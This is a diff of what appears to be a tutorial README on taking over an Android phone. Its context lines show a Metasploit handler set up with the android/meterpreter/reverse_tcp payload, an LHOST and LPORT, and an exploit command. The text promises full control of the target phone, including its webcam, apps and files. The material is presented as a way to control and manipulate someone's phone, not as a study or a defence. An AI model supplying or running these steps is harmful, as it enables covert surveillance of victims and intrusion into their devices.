@@ -27,7 +27,7 @@ how to check IP
 "help"
 {show many command  and you use command and control the phone    Everything access in that phone  ex: webcam, how many application in that phone , fiels,folder everything}
 
-{phone in your control  YOU MANUPLATE THAT PHNE AND YOU CONTROL THAT PHONE.}
+{phone in your control  YOU MANUPLATE THAT PHONE  AND YOU CONTROL THAT PHONE.}
 
 
 
@@ -47,7 +47,7 @@ service apache2 start "
 " use exploit/multi/handler "
 " set payload android/meterpreter/reverse_tcp "
 " show options "
-" set LHOST 192.168.1.3 "
+" set LHOST 192.168.1.3 "( THIS IS MY LHOST )
 "set LPORT 4444 "
 " show options "
 " exploit "
